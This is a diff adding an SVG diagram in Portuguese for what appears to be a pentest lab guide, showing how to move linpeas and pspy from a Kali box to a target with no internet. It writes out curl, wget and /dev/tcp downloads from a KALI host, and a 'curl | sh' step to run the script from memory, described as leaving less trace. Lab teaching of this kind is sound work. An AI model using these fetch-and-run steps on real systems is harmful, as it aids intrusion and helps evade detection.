@@ -1,0 +1,58 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 920 420" role="img" aria-labelledby="t2 d2">
+  <title id="t2">Levar a ferramenta de enumeração para um alvo sem internet</title>
+  <desc id="d2">Três blocos ligados por setas, da esquerda para a direita. À esquerda, a attack box Kali, dentro da rede do laboratório, serve o arquivo linpeas.sh por HTTP com o comando python3 -m http.server 8000. No meio, a rede interna do laboratório, marcada como sem acesso à internet: o alvo não baixa nada de fora, só enxerga a Kali. À direita, o alvo, onde você tem um foothold de baixo privilégio; ele puxa o script da Kali com curl ou wget, ou com o recurso embutido do bash, exec 3 abre barra dev barra tcp barra IP da Kali barra 8000 quando não há curl nem wget. Uma seta de volta, pontilhada, mostra o alvo executando o script direto da memória com o padrão curl cano sh, sem gravar em disco, para deixar menos rastro. No rodapé, a regra: ligar o lab nunca usa a internet; o download das imagens é só pelo terminal.</desc>
+  <style>
+    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
+    .t { font-size: 16px; font-weight: 700; }
+    .h { font-size: 13px; font-weight: 700; fill: #5cc8d8; }
+    .item { font-size: 10.5px; fill: #cfe0d6; }
+    .sub { font-size: 10px; fill: #9fb0a6; }
+    .box { fill: #16201b; stroke: #2c3a33; stroke-width: 1.5; }
+    .netbox { fill: #141d2a; stroke: #3a4a5a; stroke-width: 1.5; stroke-dasharray: 5 4; }
+    .flow { stroke: #5cc8d8; stroke-width: 2.5; fill: none; marker-end: url(#ac2); }
+    .back { stroke: #5ee08a; stroke-width: 2; fill: none; stroke-dasharray: 6 4; marker-end: url(#ag2); }
+    .warn { font-size: 11px; font-weight: 700; fill: #e0b23c; }
+    .mem { font-size: 10.5px; font-weight: 700; fill: #5ee08a; }
+  </style>
+  <defs>
+    <marker id="ac2" markerWidth="10" markerHeight="10" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#5cc8d8"/></marker>
+    <marker id="ag2" markerWidth="10" markerHeight="10" refX="8" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#5ee08a"/></marker>
+  </defs>
+  <rect width="920" height="420" fill="#121815"/>
+  <text class="t" x="30" y="32">Transferir a ferramenta para um alvo sem internet</text>
+
+  <!-- Kali -->
+  <rect class="box" x="30" y="70" width="250" height="150" rx="8"/>
+  <text class="h" x="50" y="98">Attack box (Kali)</text>
+  <text class="item" x="50" y="126">Serve o arquivo por HTTP:</text>
+  <text class="item" x="50" y="150">$ python3 -m http.server 8000</text>
+  <text class="sub" x="50" y="176">linpeas.sh e pspy64 ficam</text>
+  <text class="sub" x="50" y="192">na pasta servida (já baixados</text>
+  <text class="sub" x="50" y="208">antes, pelo terminal)</text>
+
+  <!-- internal net -->
+  <rect class="netbox" x="330" y="70" width="200" height="150" rx="8"/>
+  <text class="h" x="350" y="98" fill="#8fa6bf">Rede do lab</text>
+  <text class="warn" x="350" y="126">SEM internet</text>
+  <text class="sub" x="350" y="150">o alvo não baixa</text>
+  <text class="sub" x="350" y="166">nada de fora —</text>
+  <text class="sub" x="350" y="182">só enxerga a Kali</text>
+
+  <!-- target -->
+  <rect class="box" x="580" y="70" width="310" height="150" rx="8"/>
+  <text class="h" x="600" y="98">Alvo (foothold de baixo privilégio)</text>
+  <text class="item" x="600" y="126">$ curl http://KALI:8000/linpeas.sh -o /tmp/l.sh</text>
+  <text class="item" x="600" y="150">$ wget http://KALI:8000/pspy64 -O /tmp/p</text>
+  <text class="sub" x="600" y="176">sem curl/wget? use o bash builtin:</text>
+  <text class="item" x="600" y="196">exec 3&lt;&gt;/dev/tcp/KALI/8000 ...</text>
+
+  <path class="flow" d="M280,130 L328,130"/>
+  <path class="flow" d="M530,130 L578,130"/>
+
+  <!-- in-memory execution -->
+  <path class="back" d="M735,220 C735,300 400,300 300,300"/>
+  <text class="mem" x="300" y="330">rodar da memória, sem gravar em disco (menos rastro):</text>
+  <text class="item" x="300" y="352">$ curl http://KALI:8000/linpeas.sh | sh</text>
+
+  <text class="warn" x="30" y="400">regra do lab: ligar um lab nunca usa a internet; baixar imagens/ferramentas é só pelo terminal.</text>
+</svg>
